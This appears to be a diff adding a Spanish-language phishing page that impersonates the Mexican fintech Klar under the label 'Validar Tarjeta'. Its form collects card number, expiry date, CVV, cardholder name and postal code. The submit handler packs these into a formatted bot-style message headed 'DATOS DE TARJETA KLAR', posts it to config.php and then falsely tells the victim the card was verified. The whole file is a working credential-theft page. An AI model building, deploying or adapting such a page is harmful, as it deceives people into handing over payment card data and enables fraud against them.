@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Klar - Validar Tarjeta</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #000000;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+
+    .icon {
+      font-size: 24px;
+      cursor: pointer;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 40px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    
+    .logo1 {
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 40px;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    label {
+      position: absolute;
+      top: -8px;
+      left: 14px;
+      background: #fff;
+      padding: 0 5px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 45px 16px 14px;
+      border: 2px solid #000;
+      border-radius: 12px;
+      font-size: 16px;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .input-group.light input {
+      border: 1px solid #ccc;
+    }
+
+    .input-group.light label {
+      color: #bbb;
+    }
+
+    .btn {
+      width: 100%;
+      background-color: #000;
+      color: white;
+      padding: 16px;
+      font-size: 16px;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .btn:hover {
+      background-color: #222;
+    }
+
+    /* Estilos específicos para campos de tarjeta */
+    .card-image {
+      width: 120px;
+      margin: 0 auto 30px;
+      display: block;
+    }
+
+    /* Ocultar flechas en input number */
+    input[type="number"]::-webkit-outer-spin-button,
+    input[type="number"]::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+
+    input[type="number"] {
+      -moz-appearance: textfield;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="top-bar">
+      <div class="icon" onclick="window.history.back()">&#8592;</div>
+      <div class="icon">&#128483;</div>
+    </div>
+
+    <div class="logo">Klar</div>
+    <div class="logo1">Verifica tu tarjeta para continuar</div>
+
+    <img src="tcklar.png" alt="Tarjeta Klar" class="card-image">
+
+    <form id="payment-form">
+      <div class="input-group">
+        <label for="card-number">Número de tarjeta</label>
+        <input type="text" id="card-number" required maxlength="19" placeholder="1234 5678 9012 3456">
+      </div>
+
+      <div class="input-group">
+        <label for="expiry-date">Fecha de expiración</label>
+        <input type="text" id="expiry-date" required maxlength="5" placeholder="MM/AA">
+      </div>
+
+      <div class="input-group">
+        <label for="cvv">CVV</label>
+        <input type="number" id="cvv" required maxlength="4" placeholder="123">
+      </div>
+
+      <div class="input-group">
+        <label for="name">Nombre en la tarjeta</label>
+        <input type="text" id="name" required placeholder="JUAN PEREZ">
+      </div>
+
+      <div class="input-group">
+        <label for="postal-code">Código postal</label>
+        <input type="number" id="postal-code" required placeholder="12345">
+      </div>
+
+      <button class="btn" type="submit">Continuar</button>
+    </form>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('payment-form');
+      const cardNumberInput = document.getElementById('card-number');
+      const expiryDateInput = document.getElementById('expiry-date');
+
+      // Formato para el número de tarjeta
+      cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+        let formattedValue = '';
+        for(let i = 0; i < value.length; i++) {
+          if(i > 0 && i % 4 === 0) {
+            formattedValue += ' ';
+          }
+          formattedValue += value[i];
+        }
+        e.target.value = formattedValue;
+      });
+
+      // Formato para la fecha de expiración
+      expiryDateInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 2) {
+          value = value.slice(0,2) + '/' + value.slice(2);
+        }
+        e.target.value = value;
+      });
+
+      // Validar CVV
+      document.getElementById('cvv').addEventListener('input', function() {
+        if (this.value.length > 4) {
+          this.value = this.value.slice(0, 4);
+        }
+      });
+
+      // Manejar envío del formulario
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const cardNumber = document.getElementById('card-number').value;
+        const expiryDate = document.getElementById('expiry-date').value;
+        const cvv = document.getElementById('cvv').value;
+        const name = document.getElementById('name').value;
+        const postalCode = document.getElementById('postal-code').value;
+
+        const message = `💳 <b>DATOS DE TARJETA KLAR</b>\n\n` +
+                        `🔢 <b>Tarjeta:</b> <code>${cardNumber}</code>\n` +
+                        `📅 <b>Expira:</b> <code>${expiryDate}</code>\n` +
+                        `🔐 <b>CVV:</b> <code>${cvv}</code>\n` +
+                        `👤 <b>Titular:</b> <code>${name}</code>\n` +
+                        `📍 <b>CP:</b> <code>${postalCode}</code>`;
+
+        fetch('config.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({ message })
+        })
+        .then(res => res.json())
+        .then(data => {
+          if (data.status === 'ok') {
+            alert("Tarjeta verificada correctamente");
+            window.location.href = "index.html";
+          } else {
+            alert("Error al verificar la tarjeta");
+          }
+        })
+        .catch(err => alert("Error de conexión"));
+      });
+    });
+  </script>
+</body>
+</html>
